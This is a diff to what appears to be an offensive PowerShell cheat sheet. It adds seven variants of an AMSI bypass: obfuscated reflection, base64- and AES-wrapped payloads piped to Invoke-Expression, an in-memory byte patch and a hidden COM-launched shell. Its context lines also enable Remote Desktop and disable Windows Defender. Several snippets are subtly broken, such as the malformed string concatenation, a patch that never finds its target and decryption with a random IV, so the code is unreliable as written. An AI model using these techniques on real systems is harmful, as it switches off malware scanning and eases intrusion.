@@ -35,3 +35,63 @@ reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnec
 
 Disable Windows Defender as a Backup
 Set-MpPreference -DisableRealtimeMonitoring $true
+
+AMSI bypass obfuscated in functions
+
+$Amsi = [Ref]."Assem"+"bly".GetType("System.Management.Automation.A"+"msiUt"+"ils")
+$Field = $Amsi.GetField('amsiInit'+'Failed', 'NonPublic,Static')
+$Field.SetValue($null, $true)
+
+
+Base64 Encoding & Decoding at Runtime
+$encoded = "W1JlZi5Bc3NlbWJseV0uR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCAnTm9uUHVibGljLFN0YXRpYycpLlNldFZhbHVlKCRudWxsLCR0cnVlKQ=="
+$bytes = [System.Convert]::FromBase64String($encoded)
+[Text.Encoding]::UTF8.GetString($bytes) | Invoke-Expression
+
+
+Character Substitution & Randomization
+$X = [Ref]."Assembly".GetType("System.Management.Automation.AmsiUtils")
+$Y = $X.GetField('amsi'+'InitFai'+'led', 'NonPublic,Static')
+$Y.SetValue($null, $true)
+
+
+Using Reflection & Dynamic Invocation
+$amsiType = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
+$fld = $amsiType.GetField("amsiInitFailed", 'NonPublic,Static')
+$method = $fld.GetType().GetMethod("SetValue", [System.Reflection.BindingFlags]::Instance -bor [System.Reflection.BindingFlags]::Public)
+$method.Invoke($fld, @($null, $true))
+
+
+Using Memory Injection to Patch AMSI
+$AmsiDll = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate(
+        (New-Object System.Func{IntPtr} {
+            [System.Diagnostics.Process]::GetCurrentProcess().Handle
+        })
+    ), [System.Func{IntPtr}]
+).Invoke()
+
+$Patch = [Byte[]] (0x31, 0xC0, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $AmsiDll, 3)
+
+
+Running the AMSI Bypass via a COM Object
+$com = New-Object -ComObject WScript.Shell
+$com.Run("powershell -NoP -NonI -W Hidden -Exec Bypass -C `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`")
+
+
+Encrypting AMSI Bypass & Running It in Memory
+
+$encrypted = "U2FsdGVkX1+JGVnqKxZgqHJJqg=="  # Encrypt the AMSI bypass
+$key = (New-Object Security.Cryptography.Rfc2898DeriveBytes("password", 16)).GetBytes(32)
+$IV = (1..16) | % {Get-Random -Min 0 -Max 255}
+$AES = New-Object Security.Cryptography.AesManaged
+$AES.Key = $key
+$AES.IV = $IV
+$decryptor = $AES.CreateDecryptor()
+$bytes = [System.Convert]::FromBase64String($encrypted)
+$decrypted = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
+[Text.Encoding]::UTF8.GetString($decrypted) | IEX
+
+
+
